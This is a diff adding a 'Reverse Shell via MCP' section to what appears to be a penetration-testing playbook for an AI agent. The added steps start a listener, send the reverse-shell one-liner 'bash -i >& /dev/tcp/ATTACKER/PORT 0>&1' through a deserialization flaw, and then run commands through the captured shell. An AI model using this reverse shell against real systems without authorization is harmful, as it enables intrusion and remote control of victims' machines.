@@ -353,6 +353,22 @@ FileCookieJar for file write).
 
 ## Step 6: Escalate or Pivot
 
+### Reverse Shell via MCP
+
+When RCE is confirmed, **prefer catching a reverse shell via the MCP
+shell-server** over continuing to craft serialized payloads for each command.
+
+1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
+2. Send a reverse shell payload via the deserialization vector:
+   ```bash
+   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Use `send_command()` for all subsequent commands
+
+If the target lacks outbound connectivity, continue with inline command
+execution and note the limitation in state.md.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
